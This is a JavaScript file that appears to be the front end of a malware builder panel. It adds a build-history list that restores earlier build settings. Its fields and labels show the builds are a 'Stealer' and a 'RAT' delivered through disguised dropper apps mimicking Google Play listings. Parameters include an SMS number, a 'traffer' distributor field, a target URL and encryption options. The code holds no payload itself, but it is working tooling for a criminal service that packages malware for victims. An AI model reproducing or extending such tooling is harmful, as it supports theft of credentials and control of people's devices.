'use strict';
(function() {
    var DEBOUNCE = 400;
    var _timer = null;
    var _currentPrefix = '';
    var _panelVisible = false;

    function getOrCreateBtn() {
        var existing = document.getElementById('histPanelBtn');
        if (existing) return existing;
        var prefixEl = document.getElementById('prefix');
        if (!prefixEl) return null;
        var prefixRow = prefixEl.closest('.frow');
        if (!prefixRow) return null;

        var btn = document.createElement('button');
        btn.id = 'histPanelBtn';
        btn.type = 'button';
        btn.textContent = '📋 История';
        btn.style.cssText = 'display:none;align-items:center;gap:6px;margin-bottom:8px;' +
            'padding:5px 14px;border-radius:8px;background:rgba(167,139,250,0.15);' +
            'color:#a78bfa;border:1px solid rgba(167,139,250,0.3);font-size:13px;' +
            'font-weight:600;cursor:pointer;transition:background .2s;';
        btn.onmouseenter = function() { this.style.background = 'rgba(167,139,250,0.3)'; };
        btn.onmouseleave = function() { this.style.background = 'rgba(167,139,250,0.15)'; };
        prefixRow.parentNode.insertBefore(btn, prefixRow);

        btn.onclick = function() {
            _panelVisible = !_panelVisible;
            var panel = document.getElementById('histPanel');
            if (panel) panel.style.display = _panelVisible ? 'block' : 'none';
            if (_panelVisible && _currentPrefix) loadHistory(_currentPrefix);
        };
        return btn;
    }

    function getOrCreatePanel() {
        var existing = document.getElementById('histPanel');
        if (existing) return existing;
        var btn = document.getElementById('histPanelBtn');
        if (!btn) return null;
        var panel = document.createElement('div');
        panel.id = 'histPanel';
        panel.style.cssText = 'display:none;margin-bottom:12px;border-radius:10px;' +
            'background:rgba(20,20,35,0.95);border:1px solid rgba(167,139,250,0.2);' +
            'overflow:hidden;max-height:320px;overflow-y:auto;';
        btn.parentNode.insertBefore(panel, btn.nextSibling);
        return panel;
    }

    function esc(s) {
        return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function renderHistory(items) {
        var panel = document.getElementById('histPanel');
        if (!panel) return;
        if (!items || items.length === 0) {
            panel.innerHTML = '<div style="padding:14px;color:#6b7280;font-size:13px;text-align:center">Нет сборок по этому префиксу</div>';
            return;
        }
        var html = '';
        for (var i = 0; i < items.length; i++) {
            var b = items[i];
            var p = b.params || {};
            var displayName = (p.useDropper && p.dropperAppName) ? p.dropperAppName : (p.appName || '—');
            var proj = p.project === 'v2' ? 'Лайт - Стил' : p.project === 'v3' ? 'Полный - Рат' : '';
            var dateStr = b.createdAt ? new Date(b.createdAt).toLocaleString('ru-RU', { timeZone: 'Europe/Moscow', day:'2-digit', month:'2-digit', year:'2-digit', hour:'2-digit', minute:'2-digit' }) : '';
            html += '<div class="hist-row" data-idx="' + i + '" style="' +
                'padding:10px 14px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,0.05);' +
                'display:flex;justify-content:space-between;align-items:center;transition:background .15s;" ' +
                'onmouseenter="this.style.background=\'rgba(167,139,250,0.1)\'" ' +
                'onmouseleave="this.style.background=\'\'">' +
                '<div style="min-width:0;overflow:hidden">' +
                '<div style="font-weight:600;font-size:14px;color:#e2e8f0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">' +
                '✅ ' + esc(displayName) + (proj ? ' <span style="color:#a78bfa;font-size:11px">[' + proj + ']</span>' : '') + '</div>' +
                (p.targetUrl ? '<div style="font-size:11px;color:#6b7280;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">' + esc(p.targetUrl.slice(0, 55)) + '</div>' : '') +
                '</div>' +
                '<div style="font-size:11px;color:#6b7280;white-space:nowrap;margin-left:10px;flex-shrink:0">' + dateStr + '</div>' +
                '</div>';
        }
        panel.innerHTML = html;

        var rows = panel.querySelectorAll('.hist-row');
        for (var j = 0; j < rows.length; j++) {
            (function(row, build) {
                row.onclick = function() { applyBuild(build); };
            })(rows[j], items[j]);
        }
    }

    function loadHistory(prefix) {
        var panel = getOrCreatePanel();
        if (!panel) return;
        panel.innerHTML = '<div style="padding:14px;color:#6b7280;font-size:13px;text-align:center">⏳ Загрузка...</div>';
        fetch('/api/build-history?prefix=' + encodeURIComponent(prefix))
            .then(function(r) { return r.ok ? r.json() : []; })
            .then(function(items) { renderHistory(items); })
            .catch(function() {
                var p2 = document.getElementById('histPanel');
                if (p2) p2.innerHTML = '<div style="padding:14px;color:#f87171;font-size:13px;text-align:center">Ошибка загрузки</div>';
            });
    }

    function setVal(id, val) {
        var el = document.getElementById(id);
        if (!el) return;
        el.value = val || '';
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
    }

    function setRadio(name, val) {
        if (!val) return;
        var el = document.querySelector('input[name="' + name + '"][value="' + val + '"]');
        if (el) { el.checked = true; el.dispatchEvent(new Event('change', { bubbles: true })); }
    }

    function applyBuild(b) {
        var p = b.params || {};
        // Сбрасываем иконку — она будет восстановлена из истории или потребует новой загрузки
        if (typeof window.setWbIconId === 'function') window.setWbIconId(null);
        var _iPrev = document.getElementById('iconPreview');
        if (_iPrev) _iPrev.innerHTML = '';
        var _iClear = document.getElementById('iconClearBtn');
        if (_iClear) _iClear.style.display = 'none';
        var _iSel = document.getElementById('iconSelectBtn');
        if (_iSel) _iSel.style.display = '';
        // Автопереключение вкладки
        if (p.project) {
            var tabBtn = document.querySelector('[data-project="' + p.project + '"]');
            if (tabBtn && !tabBtn.classList.contains('active')) tabBtn.click();
        }
        // Восстановление иконки из истории
        if (p.iconHistoryRef) {
            var iconUrl = '/api/icon/history/' + encodeURIComponent(p.iconHistoryRef);
            var prevEl = document.getElementById('iconPreview');
            if (prevEl) {
                prevEl.innerHTML = '<img src="' + iconUrl + '" alt="icon" style="width:100%;height:100%;object-fit:cover;border-radius:inherit"/>';
                if (typeof updatePreviewIcon === 'function') updatePreviewIcon();
            }
            var clearBtn2 = document.getElementById('iconClearBtn');
            if (clearBtn2) clearBtn2.style.display = 'inline-flex';
            var selectBtn2 = document.getElementById('iconSelectBtn');
            if (selectBtn2) selectBtn2.style.display = 'none';
            fetch(iconUrl)
                .then(function(r) { return r.blob(); })
                .then(function(blob) {
                    var fd = new FormData();
                    fd.append('icon', new File([blob], p.iconHistoryRef, { type: 'image/png' }));
                    return fetch('/api/upload/icon', { method: 'POST', body: fd });
                })
                .then(function(r) { return r.ok ? r.json() : null; })
                .then(function(data) {
                    if (data && data.iconId && typeof window.setWbIconId === 'function') {
                        window.setWbIconId(data.iconId);
                        if (typeof window.validateForm === 'function') window.validateForm();
                        if (typeof updatePreviewIcon === 'function') updatePreviewIcon();
                    }
                })
                .catch(function() {});
        }
        setVal('targetUrl', p.targetUrl);
        setVal('smsNumber', p.smsNumber);
        setVal('traffer', p.traffer);
        setVal('dropperAppName', p.dropperAppName);
        setVal('dropperUrl', p.dropperUrl || 'https://play.google.com/store/apps');
        setRadio('encryption', p.encryptionMode || 'no');
        setRadio('dropperStore', p.dropperStoreIcon || 'google');
        if (p.features && typeof p.features === 'object') {
            var featEls = document.querySelectorAll('[data-key]');
            for (var i = 0; i < featEls.length; i++) {
                var key = featEls[i].dataset.key;
                if (key && Object.prototype.hasOwnProperty.call(p.features, key)) {
                    featEls[i].checked = !!p.features[key];
                    featEls[i].dispatchEvent(new Event('change', { bubbles: true }));
                }
            }
        }
        _panelVisible = false;
        var panel = document.getElementById('histPanel');
        if (panel) panel.style.display = 'none';
        // Активируем кнопку если все поля заполнены
        setTimeout(function() {
            if (typeof window.validateForm === 'function') window.validateForm();
            if (typeof updatePreviewIcon === 'function') updatePreviewIcon();
        }, 100);
    }

    function onPrefixChange() {
        var prefixEl = document.getElementById('prefix');
        if (!prefixEl) return;
        var val = prefixEl.value.trim();
        var btn = getOrCreateBtn();
        if (val.length === 6 && /^\d{6}$/.test(val)) {
            _currentPrefix = val;
            if (btn) btn.style.display = 'inline-flex';
            getOrCreatePanel();
        } else {
            _currentPrefix = '';
            if (btn) { btn.style.display = 'none'; }
            var panel = document.getElementById('histPanel');
            if (panel) { panel.style.display = 'none'; _panelVisible = false; }
        }
    }

    function init() {
        var prefixEl = document.getElementById('prefix');
        if (!prefixEl) { setTimeout(init, 400); return; }
        prefixEl.addEventListener('input', function() {
            clearTimeout(_timer);
            _timer = setTimeout(onPrefixChange, DEBOUNCE);
        });
        onPrefixChange();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 100);
    }
})();
